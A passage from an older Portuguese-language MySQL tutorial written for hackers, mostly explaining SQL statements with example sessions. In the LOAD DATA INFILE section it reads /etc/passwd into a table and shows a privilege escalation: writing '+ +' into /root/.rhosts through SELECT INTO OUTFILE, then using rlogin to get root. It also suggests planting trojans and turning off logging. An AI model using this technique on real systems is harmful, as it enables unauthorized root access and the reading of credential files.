+[table_options] [select_statement]
+
+Onde:
+
++ tbl_name eh o nome da para a tabela.
+
++ create_definition pode ser:
+
+col_name type [NOT NULL | NULL] [DEFAULT default_value] [AUTO_INCREMENT]
+            [PRIMARY KEY] [reference_definition]
+ou    PRIMARY KEY (index_col_name,...)
+ou    KEY [index_name] (index_col_name,...)
+ou    INDEX [index_name] (index_col_name,...)
+ou    UNIQUE [INDEX] [index_name] (index_col_name,...)
+ou    [CONSTRAINT symbol] FOREIGN KEY index_name (index_col_name,...)
+            [reference_definition]
+ou    CHECK (expr)
+
+type descrito acima(em create_definition)pode ser:
+
+      TINYINT[(length)] [UNSIGNED] [ZEROFILL]
+ou    SMALLINT[(length)] [UNSIGNED] [ZEROFILL]
+ou    MEDIUMINT[(length)] [UNSIGNED] [ZEROFILL]
+ou    INT[(length)] [UNSIGNED] [ZEROFILL]
+ou    INTEGER[(length)] [UNSIGNED] [ZEROFILL]
+ou    BIGINT[(length)] [UNSIGNED] [ZEROFILL]
+ou    REAL[(length,decimals)] [UNSIGNED] [ZEROFILL]
+ou    DOUBLE[(length,decimals)] [UNSIGNED] [ZEROFILL]
+ou    FLOAT[(length,decimals)] [UNSIGNED] [ZEROFILL]
+ou    DECIMAL(length,decimals) [UNSIGNED] [ZEROFILL]
+ou    NUMERIC(length,decimals) [UNSIGNED] [ZEROFILL]
+ou    CHAR(length) [BINARY]
+ou    VARCHAR(length) [BINARY]
+ou    DATE
+ou    TIME
+ou    TIMESTAMP
+ou    DATETIME
+ou    TINYBLOB
+ou    BLOB
+ou    MEDIUMBLOB
+ou    LONGBLOB
+ou    TINYTEXT
+ou    TEXT
+ou    MEDIUMTEXT
+ou    LONGTEXT
+ou    ENUM(value1,value2,value3,...)
+ou    SET(value1,value2,value3,...)
+
+index_col_name descrito em  create_definition pode ser:
+        
+      col_name [(length)]
+
+reference_definition descrito tambem em create_definition pode ser:
+
+      REFERENCES tbl_name [(index_col_name,...)]
+                   [MATCH FULL | MATCH PARTIAL]
+                   [ON DELETE reference_option]
+                   [ON UPDATE reference_option]
+
+reference_option descrito acima pode ser:
+
+      RESTRICT | CASCADE | SET NULL | NO ACTION | SET DEFAULT
+
++ table_options descrito na sintaxe de create table pode ser:
+
+      TYPE = {ISAM | MYISAM | HEAP}
+ou    AUTO_INCREMENT = #
+ou    AVG_ROW_LENGTH = #
+ou    CHECKSUM = {0 | 1}
+ou    COMMENT = "string"
+ou    MAX_ROWS = #
+ou    MIN_ROWS = #
+ou    PACK_KEYS = {0 | 1}
+ou    PASSWORD = "string"
+ou    DELAY_KEY_WRITE = {0 | 1}
+ou    ROW_FORMAT= { default | dynamic | static | compressed }
+
++ select_statement  descrito na sintaxe de create table pode ser:
+
+   [IGNORE | REPLACE] SELECT ..(Algumas declaracoes select permitidas)
+
+
+A primeira visto isso em cima parece complexo, somente a pratica mesmo 
+para deixar as coisas bem claras.De forma bem basica, basta seguir as
+regras e ver a logica.Voce jah sabe criar e usar um database, vamos agora
+criar uma simples tabela nele(Use algum database jah criado por voce):
+
+mysql> create table hackers
+    -> (grupos CHAR(15) DEFAULT ''     NOT NULL,
+    -> home_pages CHAR(30) DEFAULT ''     NOT NULL);
+Query OK, 0 rows affected (0.15 sec)
+
+Acima nos criamos a tabela hackers na primeira linha, na segunda
+declaramos um tipo de coluna CHAR (grupos) e na terceira outro tipo de
+coluna CHAR(home_pages);
+
+mysql> show tables;
++--------------+
+| Tables in nl |
++--------------+
+| hackers      |
++--------------+
+1 row in set (0.00 sec)
+
+Usamos SHOW para ver se nossa tabela foi criada mesmo.Estah criada a
+tabela!!:).Aih estah uma simples tabela.Aos poucos a gente vai engrossando
+a massa.
+
+
+* ALTER TABLE -> Nos permite mudar a estrutura de uma tabela existente.
+--------------	 Por exemplo, voce pode adicionar ou deletar colunas,criar
+		 ou destruir indexes, mudar o tipo de uma coluna existente,
+		 ou renomear colunas ou a propria tabela mesmo.Sintaxe:
+
+ALTER [IGNORE] TABLE tbl_name alter_spec [, alter_spec ...];
+
+Onde alter_spec se refere as especificacoes do ALTER, que podem ser:
+
+        ADD [COLUMN] create_definition [FIRST | AFTER column_name ]
+  or    ADD INDEX [index_name] (index_col_name,...)
+  or    ADD PRIMARY KEY (index_col_name,...)
+  or    ADD UNIQUE [index_name] (index_col_name,...)
+  or    ALTER [COLUMN] col_name {SET DEFAULT literal | DROP DEFAULT}
+  or    CHANGE [COLUMN] old_col_name create_definition
+  or    MODIFY [COLUMN] create_definition
+  or    DROP [COLUMN] col_name
+  or    DROP PRIMARY KEY
+  or    DROP INDEX index_name
+  or    RENAME [AS] new_tbl_name
+  or    table_options
+
+Seguindo o mesmo esquema do exemplo anterior com CREATE TABLE, vamos
+ver um exemplo de ALTER TABLE renomeando uma tabela(a tabela hackers que
+haviamos criado):
+
+mysql> show tables;
++--------------+
+| Tables in nl |
++--------------+
+| hackers      |
++--------------+
+1 row in set (0.03 sec)
+
+Aih estah a tabela antes.Agora executando alter:
+
+mysql> alter table hackers rename as grupos_hackers;
+Query OK, 0 rows affected (0.01 sec)
+
+mysql> show tables;
++----------------+
+| Tables in nl   |
++----------------+
+| grupos_hackers |
++----------------+
+1 row in set (0.01 sec)
+
+Como podemos ver a tabela foi renomeada de hackers para grupos_hackers.
+
+* DROP TABLE -> Eh usado para remover uma ou mais tabelas.Todos os dados
+------------    da tabela e a tabela definida sao removidos.Atencao nesse
+		comando tambem.Sua sintaxe:
+
+DROP TABLE [IF EXISTS] tbl_name [, tbl_name,...]
+
+Esse IF EXISTS eh usado para previnir erros.Um exemplo desse comando pode
+ser visto abaixo, usando nossa tabela criada nos itens anteriores:
+
+mysql> show tables;
++----------------+
+| Tables in nl   |
++----------------+
+| grupos_hackers |
++----------------+
+1 row in set (0.01 sec)
+
+Vamos apagar a tabela grupos_hackers:
+
+mysql> drop table grupos_hackers;
+Query OK, 0 rows affected (0.01 sec)
+
+mysql> show tables;
+Empty set (0.01 sec)
+
+Apagamos com sucesso.Muito cuidado com esse comando quando for usa-lo
+rede a fora.
+
+* OPTIMIZE TABLE -> Deve ser usado se voce tem deletado uma parte grande
+-----------------   de uma tabela ou se voce tem feito mudancas com o
+		    tamanho-variavel de filas(tabelas que tem colunas
+		    do tipo VARCHAR, BLOB ou TEXT).Voce pode usar OPTIMIZE
+		    TABLE para corrigir um espaco nao usado.OPTIMIZE TABLE
+		    trabalha fazendo uma copia temporaria da tabela original.
+		    A velha tabela eh copiada para a nova tabela, entao a
+		    tabela original eh deletada e a nova eh renomeada.Sintaxe:
+
+OPTIMIZE TABLE tbl_name
+
+Fucadores atencao!!Enquanto  OPTIMIZE TABLE estah executando. a tabela
+original pode ser lida por outro cliente.
+
+* SELECT -> Este eh uma intrucao interessantissima.Ela eh usado para 
+--------    resgatar fila selecionada de uma ou mais tabelas.Ela eh usada
+	    mais precisamente para analisar os dados que estao sendo 
+	    manipulados.Esse comando eh um verdadeiro canivete suico.Sintaxe:
+
+SELECT [STRAIGHT_JOIN] [SQL_SMALL_RESULT] [SQL_BIG_RESULT] [HIGH_PRIORITY]
+       [DISTINCT | DISTINCTROW | ALL] select_expression,...
+       [INTO {OUTFILE | DUMPFILE} 'file_name' export_options]
+       [FROM table_references
+       [WHERE where_definition]
+       [GROUP BY col_name,...]
+       [HAVING where_definition]
+       [ORDER BY {unsigned_integer | col_name | formula} [ASC | DESC] ,...]
+       [LIMIT [offset,] rows]
+       [PROCEDURE procedure_name] ]
+
+Isso tudo acima aih eh sua sintaxe.Nao tem muito segredo.Vejamos alguns
+argumentos:
+
++ select_expression indica a coluna que voce quer resgatar.
+
+Select tambem pode ser usado para resgatar filas computadas sem referencia
+a alguma tabela.Exemplo:
+
+mysql> select 0xa + 0x6; # Somando dois numeros hexadecimais.
++-----------+
+| 0xa + 0x6 |
++-----------+
+|        16 |
++-----------+
+1 row in set (0.01 sec)
+
+Funciona como uma verdadeira calculadora.Veja na parte de links para obter
+mais informacoes sobre select nos tutoriais que tem net a fora.
+
+* INSERT -> Insere novas filas sobre uma tabela existente.Sintaxe:
+---------
+
+   INSERT [LOW_PRIORITY | DELAYED] [IGNORE] [INTO] tbl_name [(col_name,...)]
+           VALUES (expression,...),(...),...
+
+ou INSERT [LOW_PRIORITY | DELAYED] [IGNORE] [INTO] tbl_name [(col_name,...)]
+          SELECT ...
+
+ou INSERT [LOW_PRIORITY | DELAYED] [IGNORE] [INTO] tbl_name
+          SET col_name=expression, col_name=expression, ...
+
+A primeira forma de declaracao(INSERT ... VALUES) insere filas baseadas
+em valores explicitamente especificados em tbl_name(nome da tabela).Exemplo:
+
+- Criamos tabela, se tiver aih, use qualquer uma:
+
+mysql> create table hackers
+    -> (grupos CHAR(15)  DEFAULT '' NOT NULL,
+    -> home_pages CHAR(40) DEFAULT '' NOT NULL);
+Query OK, 0 rows affected (0.01 sec)
+
+- Inserimos os valores que desejamos:
+
+mysql> insert into hackers values
+    -> ("Unsekurity Team","http://unsekurity.cyberpunk.com.br"),
+    -> ("w00w00","http://www.w00w00.org"),
+    -> ("Chaos Computer Club","http://www.ccc.de");
+Query OK, 3 rows affected (0.01 sec)
+Records: 3  Duplicates: 0  Warnings: 2
+
+Para visualizarmos a tabela podemos usar SELECT:
+
+mysql> select * from hackers;
++-----------------+------------------------------------+
+| grupos          | home_pages                         |
++-----------------+------------------------------------+
+| Unsekurity Team | http://unsekurity.cyberpunk.com.br |
+| w00w00          | http://www.w00w00.org              |
+| Chaos Computer  | http://www.ccc.de                  |
++-----------------+------------------------------------+
+3 rows in set (0.00 sec)
+
+A segundo forma se declaracao(INSERT ... SELECT) insere filas selecionadas
+de outra(s) tabela(s).Vejamos um exemplo:
+
+- Vamos inserir o dado sobre o 'Unsekurity Team' da tabela hackers acima
+  em outra tabela.Vamos criar uma nova tabela:
+
+mysql> create table fucadores_brasileiros
+    -> (grupo CHAR(15) DEFAULT '' NOT NULL,
+    -> home_page CHAR(40) DEFAULT '' NOT NULL);
+Query OK, 0 rows affected (0.01 sec)
+
+- Tabela foi criada acima, agora vamos inserir os dados da outra tabela
+  (tabela hackers), nessa tabela(tabela fucadores_brasileiros):
+
+mysql> insert into fucadores_brasileiros select * from hackers where
+    -> grupos = 'Unsekurity Team';
+Query OK, 1 row affected (0.02 sec)
+Records: 1  Duplicates: 0  Warnings: 0
+
+mysql> select * from fucadores_brasileiros;
++-----------------+------------------------------------+
+| grupo           | home_page                          |
++-----------------+------------------------------------+
+| Unsekurity Team | http://unsekurity.cyberpunk.com.br |
++-----------------+------------------------------------+
+1 row in set (0.01 sec)
+
+Aih estah.Com pratica tudo sai mano, mas cuidado na interacao dos comandos.
+
+A terceira forma de declaracao de INSERT(INSERT ... SET) serve para setar
+valores especificos para as colunas indicadas.Existe muito mais
+informacoes sobre INSERT, se necessitar, veja os links.
+
+* REPLACE -> Este comando trabalha exatamente como INSERT, exceto que se
+----------   os velhos dados gravados na tabela possuem algum valor, como
+             uma nova gravacao num unico index, os velhos dados sao
+	     deletados apos os novos dados serem inseridos.Sua Sintaxe 
+	     segue as mesmas regras de INSERT:
+
+    REPLACE [LOW_PRIORITY | DELAYED] [INTO] tbl_name [(col_name,...)]
+            VALUES (expression,...)
+
+ou  REPLACE [LOW_PRIORITY | DELAYED] [INTO] tbl_name [(col_name,...)]
+            SELECT ...
+
+ou  REPLACE [LOW_PRIORITY | DELAYED] [INTO] tbl_name
+            SET col_name=expression, col_name=expression,...
+
+
+* LOAD DATA INFILE -> Este comando le filas de um arquivo texto sobre uma
+--------------------  tabela.Sua sintaxe eh:
+
+LOAD DATA [LOW_PRIORITY] [LOCAL] INFILE 'file_name.txt' [REPLACE | IGNORE]
+          INTO TABLE tbl_name [FIELDS [TERMINATED BY '\t'] [OPTIONALLY] 
+          ENCLOSED BY ''] [ESCAPED BY '\\' ]] [LINES TERMINATED BY '\n']
+          [IGNORE number LINES] [(col_name,...)]
+
+Esse comando carrega dados de um arquivo file_name.txt sobre uma tabela
+tbl_name.Essa instrucao eh muito importante, veremos um simples exemplo
+dela.
+
+mysql> create table pass(
+    -> passwd_local char(80) not null);
+Query OK, 0 rows affected (0.02 sec)
+
+mysql> load data local infile "/etc/passwd" into table pass;
+Query OK, 18 rows affected (0.01 sec)
+Records: 18  Deleted: 0  Skipped: 0  Warnings: 0
+
+mysql> select * from pass;
++-----------------------------------------------------------+
+| passwd_local                                              |
++-----------------------------------------------------------+
+| root:x:0:0::/root:/bin/bash                               |
+| bin:x:1:1:bin:/bin:                                       |
+| daemon:x:2:2:daemon:/sbin:                                |
+| adm:x:3:4:adm:/var/log:                                   |
+| lp:x:4:7:lp:/var/spool/lpd:                               |
+| sync:x:5:0:sync:/sbin:/bin/sync                           |
+| shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown              |
+| halt:x:7:0:halt:/sbin:/sbin/halt                          |
+| mail:x:8:12:mail:/var/spool/mail:                         |
+| news:x:9:13:news:/usr/lib/news:                           |
+| uucp:x:10:14:uucp:/var/spool/uucppublic:                  |
+| operator:x:11:0:operator:/root:/bin/bash                  |
+| games:x:12:100:games:/usr/games:                          |
+| ftp:x:14:1::/home/ftp:/bin/bash                           |
+| gdm:x:42:42:GDM:/var/state/gdm:/bin/bash                  |
+| nobody:x:99:99:nobody:/:                                  |
+| nashleon:x:1000:100:nash leon,,,:/home/nashleon:/bin/bash |
+| martin:x:1001:100:martin fallon,,,:/home/martin:/bin/bash |
++-----------------------------------------------------------+
+18 rows in set (0.01 sec)
+
+Tenha calma, NewBie!!:)..Esse arquivo, todos tem permissao de leitura.Se
+voce tem somente acesso ao servidor MySQL, esse esquema pode ser util
+para pegar os logins e algumas informacoes do host alvo.Quer ver um
+esquema interessante sobre isto??? :).Se a configuracao do MySQL for
+padrao, e a porta 513(login) estiver aberta, podemos fazer:
+
+--------------------- Simples Tecnica Fucadora ---------------------------
+
+[localhost]$ ls -l /root
+/bin/ls: /root: Permission denied
+[localhost]$ echo '+ +' >> /tmp/maismais
+[localhost]$ bin/mysql -u root
+Welcome to the MySQL monitor.  Commands end with ; or \g.
+Your MySQL connection id is 3 to server version: 3.22.32
+
+Type 'help' for help.
+
+mysql> show databases;
++----------+
+| Database |
++----------+
+| mysql    |
+| test     |
++----------+
+2 rows in set (0.00 sec)
+
+mysql> use test;
+Reading table information for completion of table and column names
+You can turn off this feature to get a quicker startup with -A
+
+Database changed
+mysql> create table mais(
+    -> rlogin char(10) not null);
+Query OK, 0 rows affected (0.01 sec)
+
+mysql> load data local infile "/tmp/maismais" into table mais;
+Query OK, 1 row affected (0.02 sec)
+Records: 1  Deleted: 0  Skipped: 0  Warnings: 0
+
+mysql> select * from mais;
++--------+
+| rlogin |
++--------+
+| + +    |
++--------+
+1 row in set (0.01 sec)
+
+mysql> select * from mais into outfile "/root/.rhosts";
+Query OK, 1 row affected (0.01 sec)
+
+mysql> \q
+Bye
+
+[localhost]$ rlogin 127.0.0.1 -l root
+Linux 2.2.13.
+Last login: Wed May 31 07:00:47 -0800 2000 on tty5.
+No mail.
+[localhost]# id
+uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),
+6(disk),10(wheel),11(floppy)
+
+-------------------------------------------------------------------------
+
+Em sistemas novos, o rlogin nao permite conexao root sem senha, mas alguns
+sistemas antigos, isso ainda eh possivel.Voce pode mandar um trojan de 
+diretorio,um .profile, e etc...Use sua imaginacao e analise seu caso, o
+esquema acima pode ser feito, voce pode criar um .c e mandar compilar via
+shell script, enfim, use sua imaginacao.Outra coisa, se pode escrever num
+diretorio "/root" aonde nao escreverah??? 
+
+* SET  -> Muda ou seta valores no MySQL.
+------
+
+SET [OPTION] SQL_VALUE_OPTION= value, ...
+
+A Sintaxe acima, seta varios tipos de opcoes que mudam a operacao do servidor 
+ou do cliente.Algumas opcoes que sao setadas permanacem com efeito ateh a 
+sessao atual terminar ou ateh que voce set um valor diferente para a opcao.
+
+SET PASSWORD = PASSWORD('alguma senha')
+
+A Sintaxe acima seta senha para o usuario atual.Qualquer usuario nao
+anonymous(anonimo) pode mudar seu proprio passwd.
+
+SET PASSWORD FOR user = PASSWORD('alguma senha')
+
+A Sintaxe acima seta senha para um usuario especifico, no servidor atual.
+Somente um usuario com acesso para o banco de dados mysql pode fazer isso.
+Por padrao, somente o root pode fazer isso, ou seja:
+
+[localhost]$ bin/mysql -u root
+Welcome to the MySQL monitor.  Commands end with ; or \g.
+Your MySQL connection id is 4 to server version: 3.22.32
+
+Type 'help' for help.
+
+mysql> use mysql;
+Reading table information for completion of table and column names
+You can turn off this feature to get a quicker startup with -A
+
+Database changed
+mysql>
+
+ou se preferir:
+
+[localhost]$ bin/mysql -u root mysql
+Reading table information for completion of table and column names
+You can turn off this feature to get a quicker startup with -A
+
+Welcome to the MySQL monitor.  Commands end with ; or \g.
+Your MySQL connection id is 6 to server version: 3.22.32
+
+Type 'help' for help.
+
+mysql>
+
+A Instalacao padrao nos permite 'brincar' de varios modos com o servidor
+MySQL.Serah mostrado mais abaixo como setar passwd de modo mais especifico.
+Outras Sintaxes interessantes para SET sao:
+
+SET SQL_SAFE_MODE = 0 | 1 -> Seta modo seguro, onde se alguem tentar 
+			     instrucoes como UPDATE e DELETE, o servidor irah 
+			     abordar.Caso SQL_SAFE_MODE esteja setado com 1.
+
+SET SQL_LOG_OFF = 0 | 1 -> Se estiver setado para 1, nao irah logar no log
+                           de termino do cliente.
+
+SET SQL_LOG_UPDATE = 0 | 1 -> Se estiver setado para 0,nao logara no log
+			      de update do cliente.
+
+SET SQL_SELECT_LIMIT = value | DEFAULT -> Seta o numero maximo de gravacoes
+					  para retorno da declaracao
+					  SELECT.Por default, esse numero
+					  maximo para novas conexoes eh
+					  ilimitado, nao tem limite.
+
+
+* UPDATE  -> Essa instrucao eh usada para atualizar colunas nas saidas
+---------    das filas da tabela com novos valores.A instrucao SET eh
+	     usada em conjunto com essa para indicar quais colunas os
+	     valores delas devem ser modificados.Sua Sintaxe:
+
+UPDATE [LOW_PRIORITY] tbl_name SET col_name1=expr1,col_name2=expr2,...
+       [WHERE where_definition] [LIMIT #]
+
+Se eh dada uma instrucao WHERE, entao eh especificada quais filas devem
+ser atualizadas, senao todas as filas serao atualizadas.
+
+* FLUSH -> Essa instrucao eh usada quando queremos 'limpar' alguns dos
+--------   dados internos do cache que o MySQL usa.Para executar FLUSH,
+	   voce deve ter o privilegio reload(recarregar).Sintaxe:
+
+FLUSH flush_option [,flush_option]
+
+Onde flush_option pode ser:
+
+HOSTS -> Esvazia a tabela de hosts.
+LOGS  -> Fecha, Reabre os arquivos de log padrao e atualiza os mesmos.
+TABLES -> Fecha todas as tabelas abertas.
+PRIVILEGES -> Recarrega os privilegios de uma tabela grant(concedida) no
+	      database do mysql.
+STATUS -> Zera os muitas 'variaveis status'.
+
+* KILL -> Essa instrucao killa(derruba) um thread de uma conexao separada
+-------   no MySQL.Sintaxe:
+
+KILL thread_id
+
+Cada conexao para mysqld executa em um thread separado.Voce pode ver quais
+threads estao sendo executados com a instrucao SHOW PROCESSLIST, e killar
+um thread especifico com o comando KILL thread_id.Se voce tem o privilegio
+"process", voce pode ver e killar todos os threads, se nao tem, voce soh
+poderah ver e killar os seus processos.
+
+* EXPLAIN -> Outro canivete suico.Essa instrucao serve para nos ajudar
+----------   nos fornecendo informacoes sobre algo.Sao varias as possiveis
+	     sintaxes para essa instrucao.Vejamos:
+
++ EXPLAIN tbl_name
+
+A Sintaxe acima nos fornece informacoes sobre uma tabela.Ela eh
+equivalente a instrucao DESCRIBE tbl_name ou mesmo a instrucao SHOW
+columns FROM tbl_name.Vejamos:
+
+mysql> explain mais;
++--------+----------+------+-----+---------+-------+
+| Field  | Type     | Null | Key | Default | Extra |
++--------+----------+------+-----+---------+-------+
+| rlogin | char(10) |      |     |         |       |
++--------+----------+------+-----+---------+-------+
+1 row in set (0.03 sec)
+
+mysql> describe mais;
++--------+----------+------+-----+---------+-------+
+| Field  | Type     | Null | Key | Default | Extra |
++--------+----------+------+-----+---------+-------+
+| rlogin | char(10) |      |     |         |       |
++--------+----------+------+-----+---------+-------+
+1 row in set (0.00 sec)
+
+mysql> show columns from mais;
++--------+----------+------+-----+---------+-------+
+| Field  | Type     | Null | Key | Default | Extra |
++--------+----------+------+-----+---------+-------+
+| rlogin | char(10) |      |     |         |       |
++--------+----------+------+-----+---------+-------+
+1 row in set (0.01 sec)
+
+
++ EXPLAIN SELECT select_options
+
+A sintaxe acima indica para o MySQL como ele deve processar a instrucao
+SELECT, provendo informacoes sobre como as tabelas estao associadas e em
+que ordem.Exemplo:
+
+mysql> explain select * from mais;
++-------+--------+---------------+------+---------+------+------+-------+
+| table | type   | possible_keys | key  | key_len | ref  | rows | Extra |
++-------+--------+---------------+------+---------+------+------+-------+
+| mais  | system | NULL          | NULL |    NULL | NULL |    1 |       |
++-------+--------+---------------+------+---------+------+------+-------+
+1 row in set (0.14 sec)
+
+Existem muitas outras declaracoes e sintaxes para EXPLAIN, mas o basico eh
+isso que descrevi.
+
+* DESCRIBE -> Essa instrucao eh usada para nos dar informacoes sobre uma
+-----------   coluna de uma tabela.Sintaxe:
+
+{DESCRIBE | DESC} tbl_name {col_name | wild}
+
+Onde:
+
+col_name pode ser uma coluna ou string contendo os caracteres wildcards
+SQL '%' e '_'.Exemplo:
+
+- Criamos uma simples tabela:
+
+mysql> create table dados(nome char(30) not null, idade int(5) not null,
+    -> estado_civil char(10) not null)\g
+Query OK, 0 rows affected (0.01 sec)
+
+- Inserimos Valores:
+
+mysql> insert into dados values("Jose","21","Casado"),("Maria","20",
+    -> "Solteira"),("Joao","16","Solteiro")\g
+Query OK, 3 rows affected (0.01 sec)
+Records: 3  Duplicates: 0  Warnings: 0
+
+- Finalmente usamos DESCRIBE para obter informacoes sobre as colunas:
+
+mysql> describe dados;
++--------------+----------+------+-----+---------+-------+
+| Field        | Type     | Null | Key | Default | Extra |
++--------------+----------+------+-----+---------+-------+
+| nome         | char(30) |      |     |         |       |
+| idade        | int(5)   |      |     | 0       |       |
+| estado_civil | char(10) |      |     |         |       |
++--------------+----------+------+-----+---------+-------+
+3 rows in set (0.01 sec)
+
+mysql> desc dados nome\g
++-------+----------+------+-----+---------+-------+
+| Field | Type     | Null | Key | Default | Extra |
++-------+----------+------+-----+---------+-------+
+| nome  | char(30) |      |     |         |       |
++-------+----------+------+-----+---------+-------+
+1 row in set (0.00 sec)
+
+* CREATE INDEX -> Essa intrucao eh usada para criar index em uma tabela.
+---------------   Sua Sintaxe:
+
+CREATE [UNIQUE] INDEX index_name ON tbl_name (col_name[(length)],... )
+
+Onde index_name eh o nome do index.Exemplo:
+
+Usando a tabela criada no exemplo anterior podemos fazer:
+
+mysql> create index N on dados (nome(2))\g
+Query OK, 3 rows affected (0.03 sec)
+Records: 3  Duplicates: 0  Warnings: 0
+
+Criamos entao o index de nome "N" da tabela "dados" contendo 2 elementos
+da coluna "nome".Veremos entao informacoes sobre esse index criado:
+
+mysql> show index from dados;
++-----+----------+--------+------------+------+---------+-----------+--------+
+|Table|Non_unique|Key_name|Seq_in_index|Coluna|Collation|Cardinality|Sub_part|
++-----+----------+--------+------------+------+---------+-----------+--------+
+|dados|        1 | N      |          1 | nome | A       |  NULL     |	    2|
++-----+----------+--------+------------+------+---------+-----------+--------+
+1 row in set (0.01 sec)
+
+Eu mudei um pouco acima para que de para entender melhor.Nao se preocupe se
+nao couber um sua tela, isso eh normal.
+
+* DROP INDEX -> Instrucao usada para apagar um index.Sintaxe:
+-------------
+
+DROP INDEX index_name ON tbl_name
+
+Podemos usar o exemplo anterior para mostrar o uso de DROP INDEX.
+
+mysql> drop index N on dados\g
+Query OK, 3 rows affected (0.07 sec)
+Records: 3  Duplicates: 0  Warnings: 0
+
+* LOCK TABLES -> Essa instrucao eh usada para bloquear(travar) tabela no
+--------------   thread atual.Sua sintaxe:
+
+LOCK TABLES tbl_name [AS alias] {READ | [READ_LOCAL] | [LOW_PRIORITY]
+	    WRITE} [, tbl_name {READ | [LOW_PRIORITY] WRITE} ...]
+
+Onde:
+
+READ - Trava a tabela p/ escrita..(Cuidado para nao se confundir!).Exe:
+
+mysql> lock tables dados READ\g
+Query OK, 0 rows affected (0.01 sec)
+
+Abre uma outra conexao(no caso thread) e tente inserir valores na tabela:
+
+mysql> insert into dados values ('Silvia','17','Casada')\g
+
+Fica travada.Esperando a boa feh do cara ou um control + C.
+
+WRITE - Trava a tabela para leitura.Desse modo, a tabela nao pode ser
+	visualizada:
+
+mysql> lock table dados WRITE\g
+Query OK, 0 rows affected (0.00 sec)
+
+Em outro thread, tente:
+
+mysql> select * from dados\g
+\c
+,x,x,x
+Aborted
+
+Saih com control + C, mas se o cara que bloqueou a tabela desbloquer,
+aih tudo tranquilo.
+
+* UNLOCK TABLES -> Instrucao usada para desbloquear uma tabela.Sintaxe:
+----------------
+
+UNLOCK TABLES
+
+Nos exemplo acima, vimos como se bloqueia uma tabela, para desbloquear
+nao tem muito segredo, basta:
+
+mysql> unlock tables\g
+Query OK, 0 rows affected (0.00 sec)
+
+* GRANT -> Esta instrucao permite ao adminitrador conceder privilegio(s)
+--------   aos usuarios do MySQL em quatro niveis:
+
+Global level -> Privilegios globais, aplicados a todas as databases em
+		um dado servidor MySQL.Estes privilegios sao armazenados
+		na tabela mysql.user.
+
+Database level -> Privilegios database, aplicados a toda tabela em um
+		  dado database.Estes privilegios sao armazenados nas
+		  tabelas mysql.db e mysql.host.
+
+Table level -> Privilegios de tabela, aplica-se a todas as colunas de uma
+	       dada tabela.Esses privilegios sao armazenados na tabela
+	       mysql.tables_priv.
+
+Column level -> Privilegios de Coluna, aplica-se a coluna singular(unica)
+		em uma dada tabela.Estes privilegios sao armazenados na
+		tabela mysql.columns_priv table.
+
+A Sintaxe para GRANT eh a seguinte:
+
+GRANT priv_type [(column_list)] [, priv_type [(column_list)] ...]
+      ON {tbl_name | * | *.* | db_name.*}
+      TO user_name [IDENTIFIED BY 'password']
+      [, user_name [IDENTIFIED BY 'password'] ...] [WITH GRANT OPTION]
+
+Onde priv_type deve ser especificado como uma das seguintes maneiras:
+
+ALL PRIVILEGES      FILE                RELOAD
+ALTER               INDEX               SELECT
+CREATE              INSERT              SHUTDOWN
+DELETE              PROCESS             UPDATE
+DROP                REFERENCES          USAGE
+
+Detalhes do uso de GRANT podem ser vistos na parte 'Administracao Basica',
+mais abaixo nesse tutorial.
+
+* REVOKE -> Eh o antonimo de GRANT.GRANT eh usado para conceder privilegios,
+---------   REVOKE eh usado para remover privilegios.Sua Sintaxe:
+
+REVOKE priv_type [(column_list)] [, priv_type [(column_list)] ...]
+       ON {tbl_name | * | *.* | db_name.*}
+       FROM user_name [, user_name ...]
+
+Onde priv_type de REVOKE eh equivalente ao de GRANT.Voce pode usar qualquer
+um daqueles.
+
+Para um fucador, essas duas instrucoes podem vir a ser muito uteis.Atencao
+dobrada nelas, mas todo cuidado com essas tabelas de privilegios!
+
+Existem varios outras opcoes ainda.Mas o basico eh isso que descrevi.Com
+isso se pode fazer muita coisa, caso necessite, de uma olhada na secao
+'Links e Referencias' no final deste tutorial.
+
+4.3 Enviando Queries
+---------------------
+
+Veremos agora alguns principios basicos de entrada de comandos, usando
+alguns "queries"(pedidos de informacoes sobre algo) para nos
+familiarizarmos com a forma com que o mysql trabalha.Se voce acompanhou
+bem todas as explicacoes e exemplos, isso aqui nao eh necessario.Abaixo 
+segue um simples comando que pergunta ao servidor qual a versao dele e 
+a data atual:
+
+mysql> SELECT VERSION(), CURRENT_DATE;
++-----------+--------------+
+| version() | CURRENT_DATE |
++-----------+--------------+
+| 3.22.32   | 2000-05-24   |
++-----------+--------------+
+1 row in set (0.00 sec)
+
+mysql>
+
+Este query ilustra algumas coisas sobre mysql:
+
+* Um comando normalmente consiste de uma declaracao SQL seguida de um
+  ponto e virgula.(Existem algumas excecoes onde o ponto e virgula nao eh
+  necessario.O comando QUIT (para sair do servidor = quit) eh um deles.
+
+* Quando voce edita um comando, mysql envia ele para o servidor para
+  execucao e mostra o resultado, entao imprime outro " mysql> " para
+  indicar que ele pode ler(estah a espera) de outro comando.
+
+* Mysql mostra a saida do query como uma tabela(Filas - colunas).
+  A primeira fila contem os nomes(labels) para as colunas.As filas
+  seguintes sao os resultados dos queries.Normalmente, os nomes das colunas
+  sao das colunas que voce traz das tabelas do banco de dados.
+
+* mysql mostra quantas filas ele retornou e quanto tempo levou para
+  executar o query(1 row in set (0.00 sec)).Isto serve para nos dar uma
+  ideia da performance do servidor(meu demorado 586!!).
+
+As instrucoes podem ser digitadas em qualquer tipo(maiusculas ou minusculas),
+o mysql nao eh case sensitive.Os seguintes queries sao equivalentes:
+
+mysql> SELECT VERSION(), CURRENT_DATE;
+mysql> select version(), current_date;
+mysql> SeLeCt vErSiOn(), current_DATE;
+
+Um outro exemplo de query mostrando que o mysql pode ser usado como
+uma calculadora segue abaixo:
+
+mysql> SELECT SIN(PI()/4), (4+1)*5;
++-------------+---------+
+| SIN(PI()/4) | (4+1)*5 |
++-------------+---------+
+|    0.707107 |      25 |
++-------------+---------+
+1 row in set (0.00 sec)
+
+mysql>
+
+Os comandos acima tem sido relativamente curtos, declaracoes em uma soh
+linha.Voce pode ter multiplas declaracoes em uma soh linha.Basta separar
+com ponto e virgula, veja:
+
+mysql> SELECT VERSION(); SELECT NOW();
++-----------+
+| version() |
++-----------+
+| 3.22.32   |
++-----------+
+1 row in set (0.01 sec)
+
++---------------------+
+| NOW()               |
++---------------------+
+| 2000-05-24 22:35:39 |
++---------------------+
+1 row in set (0.00 sec)
+
+mysql>
+
+Mysql determina aonde voce declara o fim procurando o ponto e virgula
+final, e nao procurando pelo fim de uma linha.(Em outras palavras:
